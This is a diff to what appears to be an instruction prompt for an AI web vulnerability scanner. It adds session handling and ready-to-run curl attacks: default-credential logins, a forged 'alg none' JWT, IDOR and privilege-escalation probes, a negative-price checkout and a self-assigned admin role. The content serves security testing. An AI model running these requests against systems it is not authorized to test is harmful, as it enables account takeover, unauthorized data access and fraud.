@@ -22,7 +22,9 @@ You will receive:
 
 ## Process
 
-### Step 1: Initialize Attack Log
+### Step 1: Initialize Attack Environment
+
+#### 1a. Attack Log
 
 Create an in-memory attack log. Every single request you make to the target
 MUST be logged in this format:
@@ -35,6 +37,53 @@ Get the start timestamp:
 ```bash
 date +"%Y-%m-%d %H:%M:%S"
 ```
+
+#### 1b. Session State Management
+
+Create a temporary directory for session persistence:
+
+```bash
+VULCHK_SESSION_DIR=$(mktemp -d /tmp/vulchk-session-XXXXXX)
+VULCHK_COOKIE_JAR="${VULCHK_SESSION_DIR}/cookies.txt"
+VULCHK_TOKEN_FILE="${VULCHK_SESSION_DIR}/tokens.json"
+echo '{}' > "$VULCHK_TOKEN_FILE"
+```
+
+**All subsequent curl requests** MUST use `-c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR"`
+to maintain session state across requests. This enables:
+- Cookie-based session tracking
+- Authentication state persistence
+- CSRF token extraction and reuse
+
+**CRITICAL — State Extraction Rule**: After EVERY response, check for:
+1. `Set-Cookie` headers → automatically captured by `-c` flag
+2. `Authorization` / `Bearer` tokens in response body → extract and save:
+   ```bash
+   # Extract token from JSON response
+   TOKEN=$(echo "$RESPONSE" | grep -oE '"(token|access_token|accessToken)":\s*"[^"]*"' | head -1 | cut -d'"' -f4)
+   [ -n "$TOKEN" ] && echo "$TOKEN" > "${VULCHK_SESSION_DIR}/jwt.txt"
+   ```
+3. CSRF tokens in HTML forms → extract and include in subsequent POST requests:
+   ```bash
+   CSRF=$(echo "$RESPONSE" | grep -oE 'name="csrf[^"]*"\s+value="[^"]*"' | head -1 | grep -oE 'value="[^"]*"' | cut -d'"' -f2)
+   ```
+Always include captured tokens in the next request's headers.
+
+For JWT/Bearer token management:
+- When a login response contains a token, save it:
+  ```bash
+  TOKEN=$(curl -s -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+    -X POST "{target_url}/login" \
+    -H "Content-Type: application/json" \
+    -d '{"username":"test","password":"test"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+  echo "$TOKEN" > "${VULCHK_SESSION_DIR}/jwt.txt"
+  ```
+- Use the saved token in subsequent requests:
+  ```bash
+  curl -s -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+    -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt)" \
+    "{target_url}/api/protected" 2>/dev/null
+  ```
 
 ### Step 2: Execute Passive Reconnaissance Tests
 
@@ -51,13 +100,43 @@ Check for presence and correct configuration of:
 | Header | Expected | Severity if Missing |
 |---|---|---|
 | `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | High |
-| `Content-Security-Policy` | Restrictive policy | Medium |
+| `Content-Security-Policy` | Restrictive policy (see CSP analysis below) | Medium–Critical |
 | `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Medium |
 | `X-Content-Type-Options` | `nosniff` | Low |
 | `Referrer-Policy` | `strict-origin-when-cross-origin` or stricter | Low |
 | `Permissions-Policy` | Defined | Low |
 | `X-Powered-By` | Should NOT be present | Low |
 | `Server` | Should NOT reveal version | Informational |
+
+#### CSP Quality Analysis
+
+Do NOT just check if `Content-Security-Policy` header exists. Analyze its
+directives for weaknesses:
+
+| CSP Directive Issue | Severity | Why It Matters |
+|---|---|---|
+| `unsafe-inline` in `script-src` | High | Allows inline `<script>` — defeats CSP purpose |
+| `unsafe-eval` in `script-src` | High | Allows `eval()` — enables XSS exploitation |
+| `*` wildcard in `script-src` | Critical | Allows scripts from ANY domain |
+| `data:` in `script-src` | High | Allows `<script src="data:...">` injection |
+| `http:` scheme allowed | Medium | Mixed content, MitM script injection |
+| Missing `default-src` | Medium | No fallback policy for unlisted resource types |
+| Missing `frame-ancestors` | Medium | Clickjacking possible (unless X-Frame-Options set) |
+| `unsafe-inline` in `style-src` | Low | CSS injection possible but lower impact |
+| Overly broad domain (`*.example.com`) | Low | Subdomain takeover could bypass CSP |
+| Missing `upgrade-insecure-requests` | Low | HTTP resources not auto-upgraded |
+
+Parse the CSP header value and check each directive:
+```bash
+CSP=$(curl -sI --max-time 10 "{target_url}" 2>/dev/null | grep -i "content-security-policy" | cut -d: -f2-)
+echo "$CSP" | tr ';' '\n'
+```
+
+Rate the CSP strength:
+- **Strong**: No `unsafe-inline`/`unsafe-eval`, specific domains, `default-src 'none'` or `'self'`
+- **Moderate**: Has CSP but uses `unsafe-inline` or broad domains
+- **Weak**: Uses wildcards, `unsafe-eval`, or `data:` in script-src
+- **None**: No CSP header present
 
 Log each header check as a test in the attack log.
 
@@ -200,32 +279,84 @@ curl -s --max-time 10 -X POST "{target_url}/{path}" \
 
 If the request succeeds without or with an invalid CSRF token, report as vulnerable.
 
-#### 3d. Authentication Testing
+#### 3d. Authentication Testing (Stateful)
 
+Authentication tests MUST use session chaining. The goal is to test whether
+the application properly enforces access control across a sequence of requests.
+
+**Phase 1: Unauthenticated Access**
 ```bash
-# Test unauthenticated access to protected endpoints
-curl -s --max-time 10 "{target_url}/api/users" 2>/dev/null | head -20
-curl -s --max-time 10 "{target_url}/api/admin" 2>/dev/null | head -20
-curl -s --max-time 10 "{target_url}/dashboard" 2>/dev/null | head -20
+# Test protected endpoints WITHOUT authentication
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  "{target_url}/api/users" 2>/dev/null | head -20
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  "{target_url}/api/admin" 2>/dev/null | head -20
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  "{target_url}/dashboard" 2>/dev/null | head -20
+```
 
-# Test default credentials on login (common defaults only)
-curl -s --max-time 10 -X POST "{target_url}/login" \
+**Phase 2: Login and Session Capture**
+```bash
+# Attempt default credentials and capture session
+LOGIN_RESP=$(curl -s --max-time 10 \
+  -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -X POST "{target_url}/login" \
   -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"admin"}' 2>/dev/null | head -20
+  -d '{"username":"admin","password":"admin"}' 2>/dev/null)
+echo "$LOGIN_RESP" | head -20
 
-curl -s --max-time 10 -X POST "{target_url}/login" \
+# Extract JWT if present in response
+JWT_TOKEN=$(echo "$LOGIN_RESP" | grep -oE '"(token|access_token|accessToken)":\s*"[^"]*"' | head -1 | cut -d'"' -f4)
+if [ -n "$JWT_TOKEN" ]; then
+  echo "$JWT_TOKEN" > "${VULCHK_SESSION_DIR}/jwt.txt"
+  echo "JWT captured: ${JWT_TOKEN:0:20}..."
+fi
+
+# Try another default credential set
+curl -s --max-time 10 \
+  -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -X POST "{target_url}/login" \
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":"password"}' 2>/dev/null | head -20
+```
+
+**Phase 3: Authenticated Privilege Testing**
+If login succeeds (session/JWT captured), immediately test privilege boundaries:
+```bash
+# Re-test protected endpoints WITH the captured session
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt 2>/dev/null)" \
+  "{target_url}/api/admin" 2>/dev/null | head -20
+
+# Test horizontal privilege escalation (access other users' data)
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt 2>/dev/null)" \
+  "{target_url}/api/users/1" 2>/dev/null | head -20
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt 2>/dev/null)" \
+  "{target_url}/api/users/2" 2>/dev/null | head -20
+```
+
+**Phase 4: Session Invalidation Check**
+```bash
+# Logout
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -X POST "{target_url}/logout" 2>/dev/null | head -5
+
+# Try to use the old session/token AFTER logout
+curl -s --max-time 10 -b "$VULCHK_COOKIE_JAR" \
+  -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt 2>/dev/null)" \
+  "{target_url}/api/profile" 2>/dev/null | head -20
+# If this still returns 200 with data, session invalidation is broken
 ```
 
 If JWT is detected:
 ```bash
 # Decode JWT payload (no signature verification needed)
-echo "{jwt_token}" | cut -d'.' -f2 | base64 -d 2>/dev/null
+echo "$JWT_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null
 
 # Test none algorithm
-# Create: {"alg":"none","typ":"JWT"}.{original_payload}.
-NONE_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{base64_payload}."
+NONE_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.$(echo "$JWT_TOKEN" | cut -d'.' -f2)."
 curl -s --max-time 10 "{target_url}/api/profile" \
   -H "Authorization: Bearer $NONE_JWT" 2>/dev/null | head -20
 ```
@@ -308,6 +439,37 @@ Clean up:
 ```bash
 rm -f /tmp/vulchk-test.txt
 ```
+
+#### 3k. Business Logic Testing
+
+Use the session state captured in 3d to test business logic vulnerabilities:
+
+```bash
+# IDOR: Access another user's resources with authenticated session
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt 2>/dev/null)" \
+  "{target_url}/api/orders/1" 2>/dev/null | head -20
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt 2>/dev/null)" \
+  "{target_url}/api/orders/2" 2>/dev/null | head -20
+
+# Price manipulation: Modify price in checkout/order request
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt 2>/dev/null)" \
+  -X POST "{target_url}/api/checkout" \
+  -H "Content-Type: application/json" \
+  -d '{"item_id": 1, "quantity": 1, "price": -1}' 2>/dev/null | head -20
+
+# Role escalation: Attempt to modify own role/permissions
+curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
+  -H "Authorization: Bearer $(cat ${VULCHK_SESSION_DIR}/jwt.txt 2>/dev/null)" \
+  -X PUT "{target_url}/api/profile" \
+  -H "Content-Type: application/json" \
+  -d '{"role": "admin"}' 2>/dev/null | head -20
+```
+
+Report as vulnerability if the server accepts invalid values or allows
+access to other users' resources without proper authorization checks.
 
 **If intensity is active, STOP HERE and go to Step 5.**
 
@@ -474,3 +636,11 @@ ATTACK EXECUTION COMPLETE: {total_tests} tests executed, {findings_count} vulner
   to identify your test data
 - If the attack plan references codeinspector findings, prioritize testing
   those specific endpoints and patterns first
+- ALWAYS clean up the session directory at the end of testing:
+  ```bash
+  rm -rf "$VULCHK_SESSION_DIR"
+  ```
+- Use stateful session management for ALL tests — isolated requests miss
+  authentication and authorization vulnerabilities
+- When testing business logic, chain requests: login → perform action →
+  verify outcome. Do NOT test each request in isolation
